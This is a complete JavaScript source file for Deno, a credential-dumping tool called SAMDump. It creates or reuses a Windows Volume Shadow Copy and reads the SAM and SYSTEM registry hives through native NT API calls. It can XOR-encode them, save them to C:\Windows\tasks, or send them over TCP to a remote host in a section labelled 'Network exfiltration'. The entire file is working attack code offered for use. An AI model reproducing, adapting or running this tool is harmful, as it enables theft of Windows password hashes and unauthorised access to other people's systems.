#!/usr/bin/env -S deno run --allow-ffi --allow-net --allow-write
// SAMDump — Deno edition (zero npm dependencies)
// Usage: deno run --allow-ffi --allow-net --allow-write samdump.js [options]

// ═══════════════════════════════════════════════════════════════════════
// Pointer helpers
// ═══════════════════════════════════════════════════════════════════════

const ptrOf = Deno.UnsafePointer.of;

function readPtr(buf, offset = 0) {
    const v = new DataView(buf.buffer, buf.byteOffset).getBigUint64(offset, true);
    return v === 0n ? null : Deno.UnsafePointer.create(v);
}

function writePtr(buf, offset, ptr) {
    const v = ptr ? BigInt(Deno.UnsafePointer.value(ptr)) : 0n;
    new DataView(buf.buffer, buf.byteOffset).setBigUint64(offset, v, true);
}

function encodeUtf16le(str) {
    const buf = new Uint8Array((str.length + 1) * 2);
    const dv = new DataView(buf.buffer);
    for (let i = 0; i < str.length; i++) dv.setUint16(i * 2, str.charCodeAt(i), true);
    return buf;
}

function readUtf16(ptr) {
    if (!ptr) return null;
    const view = new Deno.UnsafePointerView(ptr);
    const chars = [];
    for (let off = 0; ; off += 2) {
        const c = view.getUint16(off);
        if (c === 0) break;
        chars.push(String.fromCharCode(c));
    }
    return chars.join('');
}

// ═══════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════

const FILE_READ_DATA        = 0x0001;
const FILE_READ_ATTRIBUTES  = 0x0080;
const FILE_WRITE_DATA       = 0x0002;
const FILE_WRITE_ATTRIBUTES = 0x0100;
const SYNCHRONIZE           = 0x00100000;
const FILE_SHARE_READ       = 0x00000001;
const FILE_SHARE_WRITE      = 0x00000002;
const FILE_OPEN             = 0x00000001;
const FILE_OVERWRITE_IF     = 0x00000005;
const FILE_ATTRIBUTE_NORMAL = 0x00000080;
const FILE_SYNC_IO          = 0x00000020; // FILE_SYNCHRONOUS_IO_NONALERT
const OBJ_CASE_INSENSITIVE  = 0x00000040;

const VSS_CTX_BACKUP     = 0;
const VSS_CTX_ALL        = 0xFFFFFFFF | 0;
const VSS_BT_FULL        = 1;
const VSS_OBJ_NONE       = 1;
const VSS_OBJ_SNAPSHOT   = 3;

// IVssBackupComponents vtable indices (3 IUnknown + method position)
const BC = {
    InitializeForBackup:   5,
    SetBackupState:        6,
    GatherWriterMetadata:  9,
    PrepareForBackup:      14,
    SetContext:             35,
    StartSnapshotSet:      36,
    AddToSnapshotSet:      37,
    DoSnapshotSet:         38,
    GetSnapshotProperties: 42,
    Query:                 43,
    IsVolumeSupported:     44,
};

// ═══════════════════════════════════════════════════════════════════════
// Struct layout (64-bit Windows)
// ═══════════════════════════════════════════════════════════════════════

// UNICODE_STRING
const US_LEN  = 0;  // u16
const US_MAX  = 2;  // u16
const US_BUF  = 8;  // ptr  (4 bytes padding before)
const US_SIZE = 16;

// OBJECT_ATTRIBUTES
const OA_LEN    = 0;   // u32
const OA_NAME   = 16;  // ptr to UNICODE_STRING
const OA_ATTRS  = 24;  // u32
const OA_SIZE   = 48;

// IO_STATUS_BLOCK
const IO_INFO = 8;   // u64 (Information / bytes transferred)
const IO_SIZE = 16;

// VSS_SNAPSHOT_PROP
const SP_DEVICE = 40;  // LPWSTR m_pwszSnapshotDeviceObject
const SP_SIZE   = 128;

// VSS_OBJECT_PROP
const OP_TYPE = 0;   // i32
const OP_SNAP = 8;   // VSS_SNAPSHOT_PROP starts here (after padding)
const OP_SIZE = 136;

// ═══════════════════════════════════════════════════════════════════════
// DLL bindings — ntdll
// ═══════════════════════════════════════════════════════════════════════

const ntdll = Deno.dlopen('ntdll.dll', {
    NtCreateFile: {
        parameters: ['buffer', 'u32', 'buffer', 'buffer', 'pointer',
                     'u32', 'u32', 'u32', 'u32', 'pointer', 'u32'],
        result: 'i32',
    },
    NtReadFile: {
        parameters: ['pointer', 'pointer', 'pointer', 'pointer',
                     'buffer', 'buffer', 'u32', 'buffer', 'pointer'],
        result: 'i32',
    },
    NtWriteFile: {
        parameters: ['pointer', 'pointer', 'pointer', 'pointer',
                     'buffer', 'buffer', 'u32', 'buffer', 'pointer'],
        result: 'i32',
    },
    NtClose: { parameters: ['pointer'], result: 'i32' },
});

// ═══════════════════════════════════════════════════════════════════════
// DLL bindings — shell32
// ═══════════════════════════════════════════════════════════════════════

const shell32 = Deno.dlopen('shell32.dll', {
    IsUserAnAdmin: { parameters: [], result: 'i32' },
});

// ═══════════════════════════════════════════════════════════════════════
// DLL bindings — ole32 + VssApi (conditional)
// ═══════════════════════════════════════════════════════════════════════

let CoInitializeEx, CoUninitialize, CreateVssBC, FreeShadowProps;
let vssAvailable = false;

try {
    const ole32 = Deno.dlopen('ole32.dll', {
        CoInitializeEx: { parameters: ['pointer', 'u32'], result: 'i32' },
        CoUninitialize: { parameters: [], result: 'void' },
    });
    CoInitializeEx = ole32.symbols.CoInitializeEx;
    CoUninitialize = ole32.symbols.CoUninitialize;

    for (const name of [
        'CreateVssBackupComponentsInternal',
        'CreateVssBackupComponents',
        '?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z',
    ]) {
        try {
            const lib = Deno.dlopen('VssApi.dll', {
                create: { name, parameters: ['buffer'], result: 'i32' },
                free:   { name: 'VssFreeSnapshotProperties', parameters: ['pointer'], result: 'void' },
            });
            CreateVssBC    = lib.symbols.create;
            FreeShadowProps = lib.symbols.free;
            vssAvailable   = true;
            break;
        } catch {
            try {
                const lib = Deno.dlopen('VssApi.dll', {
                    create: { name, parameters: ['buffer'], result: 'i32' },
                });
                CreateVssBC  = lib.symbols.create;
                vssAvailable = true;
                break;
            } catch { /* next name */ }
        }
    }

    if (!vssAvailable) console.log('[*] CreateVssBackupComponents export not found');
} catch (e) {
    console.log(`[*] VSS not available: ${e.message}`);
}

// ═══════════════════════════════════════════════════════════════════════
// COM vtable dispatch via Deno.UnsafeFnPointer
// ═══════════════════════════════════════════════════════════════════════

// Method signatures (all pointer params to avoid UnsafeFnPointer type issues)
const DEF = {
    release:      { parameters: ['pointer'], result: 'u32' },
    asyncWait:    { parameters: ['pointer', 'u32'], result: 'i32' },
    enumNext:     { parameters: ['pointer', 'u32', 'pointer', 'pointer'], result: 'i32' },
    initBackup:   { parameters: ['pointer', 'pointer'], result: 'i32' },
    setBS:        { parameters: ['pointer', 'i32', 'i32', 'i32', 'i32'], result: 'i32' },
    gatherMeta:   { parameters: ['pointer', 'pointer'], result: 'i32' },
    prepBackup:   { parameters: ['pointer', 'pointer'], result: 'i32' },
    setCtx:       { parameters: ['pointer', 'i32'], result: 'i32' },
    startSS:      { parameters: ['pointer', 'pointer'], result: 'i32' },
    addToSS:      { parameters: ['pointer', 'pointer', 'pointer', 'pointer'], result: 'i32' },
    doSS:         { parameters: ['pointer', 'pointer'], result: 'i32' },
    getSnapProps:  { parameters: ['pointer', 'pointer', 'pointer'], result: 'i32' },
    query:        { parameters: ['pointer', 'pointer', 'i32', 'i32', 'pointer'], result: 'i32' },
    isVolSupp:    { parameters: ['pointer', 'pointer', 'pointer', 'pointer'], result: 'i32' },
};

class COMObject {
    constructor(ptr) {
        this.ptr = ptr;
        const view = new Deno.UnsafePointerView(ptr);
        this.vtView = new Deno.UnsafePointerView(view.getPointer(0));
    }

    call(index, def, ...args) {
        const fnPtr = this.vtView.getPointer(index * 8);
        return new Deno.UnsafeFnPointer(fnPtr, def).call(this.ptr, ...args);
    }

    release() { return this.call(2, DEF.release); }
}

// ═══════════════════════════════════════════════════════════════════════
// VSS functions
// ═══════════════════════════════════════════════════════════════════════

function comInit() {
    const hr = CoInitializeEx(null, 0);
    if (hr >= 0) return true;
    if ((hr >>> 0) === 0x80010106) return false;
    throw new Error(`CoInitializeEx: 0x${(hr >>> 0).toString(16)}`);
}

function waitForAsync(ptr) {
    if (!ptr) return;
    const obj = new COMObject(ptr);
    try { obj.call(4, DEF.asyncWait, 0xFFFFFFFF); } finally { obj.release(); }
}

function makeBackupComponents() {
    const buf = new Uint8Array(8);
    const hr = CreateVssBC(buf);
    if (hr < 0) throw new Error(`CreateVssBackupComponents: 0x${(hr >>> 0).toString(16)}`);
    const ptr = readPtr(buf);
    if (!ptr) throw new Error('CreateVssBackupComponents returned NULL');
    return new COMObject(ptr);
}

function readDeviceObject(propBuf, baseOffset) {
    const ptr = readPtr(propBuf, baseOffset + SP_DEVICE);
    return readUtf16(ptr);
}

function freeSnapProp(propBuf, baseOffset) {
    if (!FreeShadowProps) return;
    const snapView = propBuf.subarray(baseOffset, baseOffset + SP_SIZE);
    FreeShadowProps(ptrOf(snapView));
}

function listShadows() {
    if (!vssAvailable) return null;
    let shouldUninit = false, backup = null, enumObj = null;

    try {
        shouldUninit = comInit();
        backup = makeBackupComponents();

        let hr = backup.call(BC.InitializeForBackup, DEF.initBackup, null);
        if (hr < 0) return null;

        hr = backup.call(BC.SetContext, DEF.setCtx, VSS_CTX_ALL);
        if (hr < 0) {
            hr = backup.call(BC.SetContext, DEF.setCtx, VSS_CTX_BACKUP);
            if (hr < 0) return null;
        }

        const guidNull = new Uint8Array(16);
        const enumBuf  = new Uint8Array(8);
        hr = backup.call(BC.Query, DEF.query, ptrOf(guidNull), VSS_OBJ_NONE, VSS_OBJ_SNAPSHOT, ptrOf(enumBuf));
        if (hr < 0) return null;

        const enumPtr = readPtr(enumBuf);
        if (!enumPtr) return null;
        enumObj = new COMObject(enumPtr);

        while (true) {
            const propBuf    = new Uint8Array(OP_SIZE);
            const fetchedBuf = new Uint8Array(4);

            try { enumObj.call(3, DEF.enumNext, 1, ptrOf(propBuf), ptrOf(fetchedBuf)); } catch { break; }

            const fetched = new DataView(fetchedBuf.buffer).getUint32(0, true);
            if (fetched === 0) break;

            const type = new DataView(propBuf.buffer).getInt32(OP_TYPE, true);
            if (type === VSS_OBJ_SNAPSHOT) {
                const dev = readDeviceObject(propBuf, OP_SNAP);
                freeSnapProp(propBuf, OP_SNAP);
                if (dev) {
                    console.log(`[+] Shadow copy found: ${dev}`);
                    return dev;
                }
            }
        }
        return null;
    } catch (e) {
        console.log(`[-] listShadows: ${e.message}`);
        return null;
    } finally {
        if (enumObj) try { enumObj.release(); } catch { /* */ }
        if (backup)  try { backup.release(); }  catch { /* */ }
        if (shouldUninit) CoUninitialize();
    }
}

function createShadowCopy(volumePath) {
    if (!vssAvailable) return null;
    let shouldUninit = false, backup = null;

    try {
        shouldUninit = comInit();
        console.log(`[+] Creating shadow copy for: ${volumePath}`);
        backup = makeBackupComponents();

        let hr = backup.call(BC.InitializeForBackup, DEF.initBackup, null);
        if (hr < 0) { console.log(`[-] InitializeForBackup: 0x${(hr >>> 0).toString(16)}`); return null; }

        const guidNull = new Uint8Array(16);
        const volBuf   = encodeUtf16le(volumePath);

        try {
            const suppBuf = new Uint8Array(4);
            backup.call(BC.IsVolumeSupported, DEF.isVolSupp, ptrOf(guidNull), ptrOf(volBuf), ptrOf(suppBuf));
            if (!new DataView(suppBuf.buffer).getInt32(0, true)) {
                console.log(`[-] Volume ${volumePath} not supported`);
                return null;
            }
        } catch { /* non-fatal */ }

        hr = backup.call(BC.SetContext, DEF.setCtx, VSS_CTX_BACKUP);
        if (hr < 0) { console.log(`[-] SetContext: 0x${(hr >>> 0).toString(16)}`); return null; }

        backup.call(BC.SetBackupState, DEF.setBS, 0, 0, VSS_BT_FULL, 0);

        try {
            const ab = new Uint8Array(8);
            backup.call(BC.GatherWriterMetadata, DEF.gatherMeta, ptrOf(ab));
            waitForAsync(readPtr(ab));
        } catch { /* */ }

        const ssIdBuf = new Uint8Array(16);
        hr = backup.call(BC.StartSnapshotSet, DEF.startSS, ptrOf(ssIdBuf));
        if (hr < 0) { console.log('[-] StartSnapshotSet failed'); return null; }

        const snapIdBuf = new Uint8Array(16);
        hr = backup.call(BC.AddToSnapshotSet, DEF.addToSS, ptrOf(volBuf), ptrOf(guidNull), ptrOf(snapIdBuf));
        if (hr < 0) { console.log('[-] AddToSnapshotSet failed'); return null; }

        try {
            const ab = new Uint8Array(8);
            backup.call(BC.PrepareForBackup, DEF.prepBackup, ptrOf(ab));
            waitForAsync(readPtr(ab));
        } catch { /* */ }

        const ab3 = new Uint8Array(8);
        backup.call(BC.DoSnapshotSet, DEF.doSS, ptrOf(ab3));
        const asyncPtr = readPtr(ab3);
        if (asyncPtr) {
            const obj = new COMObject(asyncPtr);
            hr = obj.call(4, DEF.asyncWait, 0xFFFFFFFF);
            obj.release();
        } else { hr = -1; }

        if (hr < 0) { console.log('[-] DoSnapshotSet failed'); return null; }

        const propBuf = new Uint8Array(SP_SIZE);
        hr = backup.call(BC.GetSnapshotProperties, DEF.getSnapProps, ptrOf(snapIdBuf), ptrOf(propBuf));
        if (hr >= 0) {
            const dev = readDeviceObject(propBuf, 0);
            if (FreeShadowProps) FreeShadowProps(ptrOf(propBuf));
            if (dev) { console.log(`[+] Shadow copy created: ${dev}`); return dev; }
        }
        return null;
    } catch (e) {
        console.log(`[-] createShadowCopy: ${e.message}`);
        return null;
    } finally {
        if (backup) try { backup.release(); } catch { /* */ }
        if (shouldUninit) CoUninitialize();
    }
}

async function verifyShadowReady(shadowPath, maxRetries = 10, delay = 1000) {
    const testPath = shadowPath + '\\windows\\system32\\config\\sam';
    for (let i = 0; i < maxRetries; i++) {
        const h = openFileNt(testPath);
        if (h) { ntdll.symbols.NtClose(h); console.log('[+] Shadow copy is ready'); return true; }
        if (i < maxRetries - 1) {
            console.log(`[*] Shadow copy not ready yet (${i + 1}/${maxRetries})...`);
            await new Promise(r => setTimeout(r, delay));
        }
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════
// NT file I/O
// ═══════════════════════════════════════════════════════════════════════

function openFileNt(filePath, write = false) {
    const pathBuf = encodeUtf16le(filePath);

    const us = new Uint8Array(US_SIZE);
    const usView = new DataView(us.buffer);
    usView.setUint16(US_LEN, filePath.length * 2, true);
    usView.setUint16(US_MAX, filePath.length * 2 + 2, true);
    writePtr(us, US_BUF, ptrOf(pathBuf));

    const oa = new Uint8Array(OA_SIZE);
    const oaView = new DataView(oa.buffer);
    oaView.setUint32(OA_LEN, OA_SIZE, true);
    writePtr(oa, OA_NAME, ptrOf(us));
    oaView.setUint32(OA_ATTRS, OBJ_CASE_INSENSITIVE, true);

    const ioStatus  = new Uint8Array(IO_SIZE);
    const handleBuf = new Uint8Array(8);

    const access = write
        ? FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE
        : FILE_READ_DATA  | FILE_READ_ATTRIBUTES  | SYNCHRONIZE;

    const status = ntdll.symbols.NtCreateFile(
        handleBuf, access, oa, ioStatus, null,
        write ? FILE_ATTRIBUTE_NORMAL : 0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        write ? FILE_OVERWRITE_IF : FILE_OPEN,
        FILE_SYNC_IO, null, 0
    );

    if (status !== 0) return null;
    return readPtr(handleBuf);
}

function readFileNt(handle) {
    const chunks = [];
    let totalLen = 0;
    const chunkSize = 4096;
    const buf       = new Uint8Array(chunkSize);
    const ioStatus  = new Uint8Array(IO_SIZE);
    const offsetBuf = new Uint8Array(8);
    const offView   = new DataView(offsetBuf.buffer);

    while (true) {
        const status = ntdll.symbols.NtReadFile(
            handle, null, null, null, ioStatus, buf, chunkSize, offsetBuf, null
        );

        if ((status >>> 0) === 0xC0000011) break; // STATUS_END_OF_FILE
        if (status !== 0 && status !== 0x103) break;

        const bytesRead = Number(new DataView(ioStatus.buffer).getBigUint64(IO_INFO, true));
        if (bytesRead === 0) break;

        chunks.push(new Uint8Array(buf.subarray(0, bytesRead)));
        totalLen += bytesRead;
        offView.setBigInt64(0, offView.getBigInt64(0, true) + BigInt(bytesRead), true);
    }

    const result = new Uint8Array(totalLen);
    let pos = 0;
    for (const c of chunks) { result.set(c, pos); pos += c.length; }
    return result;
}

function writeFileNt(filePath, data) {
    const handle = openFileNt(filePath, true);
    if (!handle) { console.log(`[-] Error creating file: ${filePath}`); return false; }

    const ioStatus  = new Uint8Array(IO_SIZE);
    const offsetBuf = new Uint8Array(8);

    const status = ntdll.symbols.NtWriteFile(
        handle, null, null, null, ioStatus, data, data.length, offsetBuf, null
    );
    ntdll.symbols.NtClose(handle);

    if (status !== 0) {
        console.log(`[-] Error writing: ${filePath}, NTSTATUS: 0x${(status >>> 0).toString(16).padStart(8, '0')}`);
        return false;
    }
    console.log(`[+] Written ${data.length} bytes to ${filePath}`);
    return true;
}

function readFile(filePath) {
    const handle = openFileNt(filePath);
    if (!handle) { console.log(`[-] Error opening file: ${filePath}`); return null; }
    const content = readFileNt(handle);
    ntdll.symbols.NtClose(handle);
    console.log(`[+] Read ${content.length} bytes from ${filePath}`);
    return content;
}

// ═══════════════════════════════════════════════════════════════════════
// XOR encode
// ═══════════════════════════════════════════════════════════════════════

function xorEncode(data, key) {
    if (!key) return data;
    const k = new TextEncoder().encode(key);
    const out = new Uint8Array(data);
    for (let i = 0; i < out.length; i++) out[i] ^= k[i % k.length];
    return out;
}

// ═══════════════════════════════════════════════════════════════════════
// Network exfiltration (Deno.connect)
// ═══════════════════════════════════════════════════════════════════════

async function sendFilesRemotely(samData, systemData, host, port) {
    try {
        const conn = await Deno.connect({ hostname: host, port });
        console.log(`[+] Connected to ${host}:${port}`);

        for (const [name, data] of [['SAM', samData], ['SYSTEM', systemData]]) {
            const header = new Uint8Array(40);
            const nameBytes = new TextEncoder().encode(name);
            header.set(nameBytes.subarray(0, Math.min(nameBytes.length, 32)));
            new DataView(header.buffer).setUint32(32, data.length, false);
            await conn.write(header);
            await conn.write(data);
            console.log(`[+] ${name} sent (${data.length} bytes)`);
        }

        conn.close();
        return true;
    } catch (e) {
        console.log(`[-] Error connecting to ${host}:${port}: ${e.message}`);
        return false;
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Local save
// ═══════════════════════════════════════════════════════════════════════

function saveFilesLocally(samData, systemData, baseDir, samName, systemName) {
    const s1 = writeFileNt(`\\??\\${baseDir}${samName}`, samData);
    const s2 = writeFileNt(`\\??\\${baseDir}${systemName}`, systemData);
    console.log(s1 && s2 ? '[+] Success saving files locally' : '[-] Error saving files locally');
    return s1 && s2;
}

// ═══════════════════════════════════════════════════════════════════════
// CLI
// ═══════════════════════════════════════════════════════════════════════

function parseCliArgs() {
    const a = {
        saveLocal: false, outputDir: 'C:\\Windows\\tasks',
        sendRemote: false, host: '127.0.0.1', port: 7777,
        xorEncode: false, xorKey: 'SAMDump2025',
        disk: 'C:\\', shadowDevice: '', help: false,
    };
    for (let i = 0; i < Deno.args.length; i++) {
        switch (Deno.args[i]) {
            case '--save-local':  a.saveLocal = true; break;
            case '--send-remote': a.sendRemote = true; break;
            case '--xor-encode':  a.xorEncode = true; break;
            case '--help':        a.help = true; break;
            case '--output-dir':    a.outputDir = Deno.args[++i]; break;
            case '--host':          a.host = Deno.args[++i]; break;
            case '--port':          a.port = parseInt(Deno.args[++i]); break;
            case '--xor-key':       a.xorKey = Deno.args[++i]; break;
            case '--disk':          a.disk = Deno.args[++i]; break;
            case '--shadow-device': a.shadowDevice = Deno.args[++i]; break;
        }
    }
    return a;
}

// ═══════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════

async function main() {
    const args = parseCliArgs();

    if (args.help || (!args.saveLocal && !args.sendRemote)) {
        console.log(`SAMDump — extract SAM/SYSTEM via VSS + NT native API (Deno, zero deps)

Usage: deno run --allow-ffi --allow-net --allow-write samdump.js [options]

  --save-local          Save files locally
  --output-dir <path>   Output directory (default: C:\\Windows\\tasks)
  --send-remote         Send files over TCP
  --host <ip>           Remote host (default: 127.0.0.1)
  --port <port>         Remote port (default: 7777)
  --xor-encode          XOR encode before save/send
  --xor-key <key>       XOR key (default: SAMDump2025)
  --disk <vol>          Volume for shadow copy (default: C:\\)
  --shadow-device <dev> Use existing shadow device path (skip VSS)`);
        Deno.exit(args.help ? 0 : 1);
    }

    if (!shell32.symbols.IsUserAnAdmin()) {
        console.log('[-] ERROR: Administrator privileges required');
        Deno.exit(1);
    }

    let shadowDevice = args.shadowDevice;

    if (!shadowDevice) {
        console.log('[+] Checking for existing shadow copies...');
        shadowDevice = listShadows();

        if (!shadowDevice) {
            console.log('[+] No shadow copies found. Creating a new one...');
            shadowDevice = createShadowCopy(args.disk);

            if (shadowDevice) {
                let td = shadowDevice;
                if (td.startsWith('\\\\?\\')) td = td.replace('\\\\?\\', '\\??\\');
                if (!td.startsWith('\\??\\')) td = '\\??\\' + td;
                console.log('[+] Verifying shadow copy readiness...');
                if (!await verifyShadowReady(td)) {
                    console.log('[-] Shadow copy not ready after waiting');
                    Deno.exit(1);
                }
            }
        }

        if (!shadowDevice) {
            console.log('[-] Failed to obtain shadow copy. Pass --shadow-device manually.');
            Deno.exit(1);
        }
    }

    if (shadowDevice.startsWith('\\\\?\\'))
        shadowDevice = shadowDevice.replace('\\\\?\\', '\\??\\');
    if (!shadowDevice.startsWith('\\??\\'))
        shadowDevice = '\\??\\' + shadowDevice;

    console.log('[+] Reading files from shadow copy...');
    let samData    = readFile(shadowDevice + '\\windows\\system32\\config\\sam');
    let systemData = readFile(shadowDevice + '\\windows\\system32\\config\\system');

    if (!samData || !systemData) {
        console.log('[-] Error reading files from shadow copy');
        Deno.exit(1);
    }

    if (args.xorEncode) {
        console.log(`[+] XOR-encoding with key: ${args.xorKey}`);
        samData    = xorEncode(samData, args.xorKey);
        systemData = xorEncode(systemData, args.xorKey);
        console.log('[+] Files XOR-encoded');
    }

    if (args.saveLocal) {
        const dir = args.outputDir.replace(/\\+$/, '');
        saveFilesLocally(samData, systemData, dir, '\\sam.txt', '\\system.txt');
    }

    if (args.sendRemote) {
        const ok = await sendFilesRemotely(samData, systemData, args.host, args.port);
        console.log(ok ? '[+] Success sending files remotely' : '[-] Error sending files remotely');
    }

    console.log('[+] Done!');
}

main();
